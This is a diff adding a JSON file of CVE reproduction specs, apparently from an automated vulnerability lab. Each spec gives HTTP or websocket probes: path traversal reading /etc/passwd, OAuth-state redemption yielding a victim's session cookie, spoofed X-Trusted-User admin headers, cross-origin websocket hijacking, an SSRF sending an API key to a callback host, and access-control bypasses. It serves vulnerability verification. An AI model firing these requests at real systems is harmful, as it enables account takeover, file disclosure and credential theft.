@@ -1,0 +1,405 @@
+[
+  {
+    "from": "baseline-2026-10-29/CVE-2026-103028 (attempted_spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "http",
+      "observable_effect": "On a target whose file pattern filter on / denies *.dat, copying a denied source to /cvelab_copied.txt succeeds and reading /cvelab_copied.txt back returns 200; a patched build refuses the copy and the read returns 404.",
+      "inputs": [
+        "basic_auth",
+        "source"
+      ],
+      "auth": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [
+            {
+              "bind": "token",
+              "query": [
+                {
+                  "method": "GET",
+                  "path": "/api/v2/user/token",
+                  "headers": {
+                    "Authorization": "{{basic_auth}}"
+                  },
+                  "body": null
+                }
+              ],
+              "extract": {
+                "json_values": "access_token"
+              }
+            }
+          ],
+          "probe": [
+            {
+              "method": "DELETE",
+              "path": "/api/v2/user/files?path=%2Fcvelab_copied.txt",
+              "headers": {
+                "Authorization": "Bearer {{token}}"
+              },
+              "body": null
+            },
+            {
+              "method": "POST",
+              "path": "/api/v2/user/file-actions/copy?path={{source}}&target=%2Fcvelab_copied.txt",
+              "headers": {
+                "Authorization": "Bearer {{token}}"
+              },
+              "body": null
+            },
+            {
+              "method": "GET",
+              "path": "/api/v2/user/files?path=%2Fcvelab_copied.txt",
+              "headers": {
+                "Authorization": "Bearer {{token}}"
+              },
+              "body": null
+            }
+          ],
+          "expect": {
+            "status": 200
+          }
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "batch10-2026-10-28/CVE-2026-105859 (attempted_spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "http",
+      "observable_effect": "An unauthenticated POST /api/reorder naming a document titled Fixed position, which the collection update access forbids, is accepted with HTTP 200 on an instance whose orderable collection has update access excluding that title.",
+      "inputs": [],
+      "auth": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [
+            {
+              "bind": "fixed_id",
+              "query": [
+                {
+                  "method": "GET",
+                  "path": "/api/orderable?where[title][equals]=Fixed%20position&depth=0",
+                  "headers": {},
+                  "body": null
+                }
+              ],
+              "extract": {
+                "json_values": "id"
+              }
+            },
+            {
+              "bind": "target_id",
+              "query": [
+                {
+                  "method": "GET",
+                  "path": "/api/orderable?where[title][not_equals]=Fixed%20position&limit=1&depth=0",
+                  "headers": {},
+                  "body": null
+                }
+              ],
+              "extract": {
+                "json_values": "id"
+              }
+            },
+            {
+              "bind": "target_key",
+              "query": [
+                {
+                  "method": "GET",
+                  "path": "/api/orderable?where[title][not_equals]=Fixed%20position&limit=1&depth=0",
+                  "headers": {},
+                  "body": null
+                }
+              ],
+              "extract": {
+                "json_values": "_order"
+              }
+            }
+          ],
+          "probe": [
+            {
+              "method": "POST",
+              "path": "/api/reorder",
+              "headers": {
+                "Content-Type": "application/json"
+              },
+              "body": "{\"collectionSlug\": \"orderable\", \"docsToMove\": [\"{{fixed_id}}\"], \"newKeyWillBe\": \"greater\", \"orderableFieldName\": \"_order\", \"target\": {\"id\": \"{{target_id}}\", \"key\": \"{{target_key}}\"}}"
+            }
+          ],
+          "expect": {
+            "status": 200
+          }
+        }
+      ],
+      "setup": [
+        {
+          "method": "POST",
+          "path": "/lab/seed",
+          "headers": {},
+          "body": null
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "batch10-2026-10-28/CVE-2026-59178 (spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "ws",
+      "observable_effect": "unauthenticated devices/list returns a result on the upgraded websocket",
+      "inputs": [],
+      "auth": {},
+      "ws_path": "/ws",
+      "ws_headers": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [],
+          "probe": [
+            {
+              "send": "{\"command\": \"devices/list\", \"message_id\": \"cvelab-1\", \"args\": {}}",
+              "read_until": "cvelab-1",
+              "read_bytes": 1048576
+            }
+          ],
+          "expect": {
+            "body_contains": "\"result\""
+          }
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "manual-poc-2026-10-28/CVE-2026-114607 (spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "http",
+      "observable_effect": "GET /api/auth/magic-link/verify redeems a GitHub OAuth state issued by sign-in/social and answers with a Set-Cookie session header, which the fixed build does not return.",
+      "inputs": [
+        "victim_email"
+      ],
+      "auth": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [
+            {
+              "bind": "state",
+              "query": [
+                {
+                  "method": "POST",
+                  "path": "/api/auth/sign-in/social",
+                  "headers": {
+                    "Origin": "http://localhost:3000",
+                    "Content-Type": "application/json"
+                  },
+                  "body": "{\"provider\": \"github\", \"disableRedirect\": true, \"additionalData\": {\"type\": \"magic-link\", \"email\": \"{{victim_email}}\"}}"
+                }
+              ],
+              "extract": {
+                "regex": "state=([A-Za-z0-9_\\-]+)"
+              }
+            }
+          ],
+          "probe": [
+            {
+              "method": "GET",
+              "path": "/api/auth/magic-link/verify?token={{state}}",
+              "headers": {
+                "Origin": "http://localhost:3000"
+              },
+              "body": null
+            }
+          ],
+          "expect": {
+            "header": "set-cookie"
+          }
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "rerun3-2026-10-24/CVE-2026-114126 (spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "ws",
+      "observable_effect": "HTTP 101 Switching Protocols on the server channel for a foreign Origin after a channel token was read from served HTML",
+      "inputs": [],
+      "auth": {},
+      "ws_path": "/storybook-server-channel?token={{token}}&page=preview",
+      "ws_headers": {
+        "Origin": "http://198.51.100.7:6006"
+      },
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [
+            {
+              "bind": "token",
+              "query": [
+                {
+                  "method": "GET",
+                  "path": "/iframe.html",
+                  "headers": {},
+                  "body": null
+                }
+              ],
+              "extract": {
+                "regex": "(?:wsToken|STORYBOOK_WEBSOCKET_TOKEN|token=)[^0-9a-fA-F-]{0,12}([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"
+              }
+            }
+          ],
+          "probe": [
+            {
+              "send": "",
+              "read_bytes": 1048576
+            }
+          ],
+          "expect": {
+            "status": 101
+          }
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "selected10-2026-11-01/CVE-2025-66645 (spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "http",
+      "observable_effect": "An unauthenticated GET to a /media/ URL with percent-encoded dot segments returns the contents of /etc/passwd from outside the media root with HTTP 200.",
+      "inputs": [],
+      "auth": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [],
+          "probe": [
+            {
+              "method": "GET",
+              "path": "/media/%2e%2e/etc/passwd",
+              "headers": {},
+              "body": null
+            },
+            {
+              "method": "GET",
+              "path": "/media/%2e%2e/%2e%2e/etc/passwd",
+              "headers": {},
+              "body": null
+            },
+            {
+              "method": "GET",
+              "path": "/media/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+              "headers": {},
+              "body": null
+            },
+            {
+              "method": "GET",
+              "path": "/media/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+              "headers": {},
+              "body": null
+            }
+          ],
+          "expect": {
+            "body_contains": "root:x:0:0"
+          }
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "selected10-2026-11-01/CVE-2026-56678 (attempted_spec)",
+    "spec": {
+      "strategy": "oob_callback",
+      "transport": "http",
+      "observable_effect": "The service sends the submitted API key as a Bearer Authorization header to the caller-chosen host in the region value, and that outbound request reaches the script's callback listener carrying the marker.",
+      "inputs": [],
+      "auth": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [],
+          "probe": [
+            {
+              "method": "POST",
+              "path": "/api/oauth/kiro/api-key",
+              "headers": {
+                "Content-Type": "application/json"
+              },
+              "body": "{\"apiKey\": \"{{marker}}-key\", \"region\": \"{{callback}}/{{marker}}#\"}"
+            }
+          ]
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "selected10-2026-11-01/CVE-2026-81888 (spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "http",
+      "observable_effect": "A GET to /google carrying a code and no state query or state cookie returns HTTP 200 with the user and token of the account that code belongs to, where a fixed build returns 401.",
+      "inputs": [
+        "google_code"
+      ],
+      "auth": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [],
+          "probe": [
+            {
+              "method": "GET",
+              "path": "/google?code={{google_code}}",
+              "headers": {},
+              "body": null
+            }
+          ],
+          "expect": {
+            "status": 200
+          }
+        }
+      ],
+      "health_timeout": 120
+    }
+  },
+  {
+    "from": "test5-2026-10-29/CVE-2026-71485 (spec)",
+    "spec": {
+      "strategy": "direct_observation",
+      "transport": "ws",
+      "observable_effect": "A tokenless connect frame with headers X-Trusted-User=admin yields a connect reply whose backend-decided data has principal admin and source forwarded-header.",
+      "inputs": [],
+      "auth": {},
+      "ws_path": "/connection/websocket",
+      "ws_headers": {},
+      "checks": [
+        {
+          "label": "spec",
+          "discover": [],
+          "probe": [
+            {
+              "send": "{\"id\":1,\"connect\":{\"name\":\"cvelab\",\"headers\":{\"X-Trusted-User\":\"admin\"}}}\n",
+              "read_until": "\n",
+              "read_bytes": 1048576
+            }
+          ],
+          "expect": {
+            "body_contains": "forwarded-header"
+          }
+        }
+      ],
+      "health_timeout": 120
+    }
+  }
+]
